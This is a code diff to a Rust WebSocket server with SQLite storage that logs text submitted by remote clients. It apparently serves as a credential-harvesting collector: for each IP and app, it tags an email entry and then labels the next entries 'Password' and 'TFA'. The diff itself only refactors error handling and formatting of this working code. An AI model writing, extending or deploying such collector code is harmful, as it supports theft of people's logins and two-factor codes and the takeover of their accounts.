@@ -24,11 +24,11 @@ pub mod cli {
 pub mod server {
     use std::net::Ipv4Addr;
 
-use actix_web::{App, Error, HttpRequest, HttpResponse, HttpServer, rt, web};
+    use super::db::*;
+    use actix_web::{App, Error, HttpRequest, HttpResponse, HttpServer, rt, web};
     use actix_ws::AggregatedMessage;
     use futures_util::StreamExt as _;
     use serde::Deserialize;
-    use super::db::*;
 
     pub async fn run(port: u16) -> Result<(), std::io::Error> {
         HttpServer::new(|| App::new().route("/", web::get().to(handle_wsmessage)))
@@ -80,7 +80,10 @@ use actix_web::{App, Error, HttpRequest, HttpResponse, HttpServer, rt, web};
                             );
                         }
                     },
-                    Ok(_) => (),
+                    Ok(_) => {
+                        eprintln!("Error: Invalid message.");
+                        eprintln!("Tip: the message must be a text message");
+                    }
                     Err(err) => {
                         eprintln!("Error: WebSocket stream error: {err}");
                         break;
@@ -103,14 +106,13 @@ use actix_web::{App, Error, HttpRequest, HttpResponse, HttpServer, rt, web};
         pub app: String,
         pub content: String,
     }
-
 }
 
 pub mod db {
-    use sqlx::{Pool, Sqlite, SqlitePool, sqlite::SqliteConnectOptions};
-    use std::{str::FromStr};
-    use email_address::EmailAddress;
     use super::server::LogPayload;
+    use email_address::EmailAddress;
+    use sqlx::{Pool, Sqlite, SqlitePool, sqlite::SqliteConnectOptions};
+    use std::{fmt, str::FromStr};
 
     pub async fn connect_db() -> Result<Pool<Sqlite>, sqlx::Error> {
         let options =
@@ -125,7 +127,7 @@ pub mod db {
         ip: &str,
         app: &str,
         pool: &Pool<Sqlite>,
-    ) -> Result<String, sqlx::Error> {
+    ) -> Result<Option<String>, sqlx::Error> {
         let row: Option<(String,)> = sqlx::query_as(
             "SELECT type FROM logs WHERE ip = ? AND app = ? ORDER BY id DESC LIMIT 1",
         )
@@ -134,26 +136,30 @@ pub mod db {
         .fetch_optional(pool)
         .await?;
 
-        Ok(row.map(|r| r.0).unwrap_or_else(|| "None".to_string()))
+        Ok(row.map(|r| r.0))
     }
 
-    async fn check_content(payload: &LogPayload, pool: &Pool<Sqlite>) -> ContentTypes {
+    async fn check_content(
+        payload: &LogPayload,
+        pool: &Pool<Sqlite>,
+    ) -> Result<ContentTypes, sqlx::Error> {
         if EmailAddress::is_valid(&payload.content) {
-            return ContentTypes::Email;
+            return Ok(ContentTypes::Email);
         }
 
-        let last_type = match check_last_log_type(&payload.ip.to_string(), &payload.app, pool).await
-        {
-            Ok(t) => t,
-            Err(_) => return ContentTypes::PlainText,
-        };
+        let last_type = check_last_log_type(&payload.ip.to_string(), &payload.app, pool).await?;
 
-        if last_type == "Email" {
-            ContentTypes::Password
-        } else if last_type == "Password" {
-            ContentTypes::TFA
-        } else {
-            ContentTypes::PlainText
+        match last_type {
+            Some(last_type) => {
+                if last_type == "Email" {
+                    Ok(ContentTypes::Password)
+                } else if last_type == "Password" {
+                    Ok(ContentTypes::TFA)
+                } else {
+                    Ok(ContentTypes::PlainText)
+                }
+            }
+            None => Ok(ContentTypes::PlainText),
         }
     }
 
@@ -173,21 +179,18 @@ pub mod db {
         .execute(pool)
         .await?;
 
+        let content_type = check_content(&payload, pool).await?;
+
         sqlx::query(
             r#"
-            INSERT INTO logs (ip, app, content, type)
-            VALUES (?, ?, ?, ?)
-        "#,
+                        INSERT INTO logs (ip, app, content, type)
+                        VALUES (?, ?, ?, ?)
+                    "#,
         )
         .bind(&payload.ip.to_string())
         .bind(&payload.app)
         .bind(&payload.content)
-        .bind(match check_content(&payload, pool).await {
-            ContentTypes::Email => "Email",
-            ContentTypes::Password => "Password",
-            ContentTypes::TFA => "TFA",
-            ContentTypes::PlainText => "PlainText"
-        })
+        .bind(content_type.to_string())
         .execute(pool)
         .await?;
 
@@ -199,5 +202,16 @@ pub mod db {
         Password,
         TFA,
         PlainText,
+    }
+
+    impl fmt::Display for ContentTypes {
+        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+            match self {
+                ContentTypes::Email => write!(f, "Email"),
+                ContentTypes::Password => write!(f, "Password"),
+                ContentTypes::TFA => write!(f, "TFA"),
+                ContentTypes::PlainText => write!(f, "PlainText"),
+            }
+        }
     }
 }
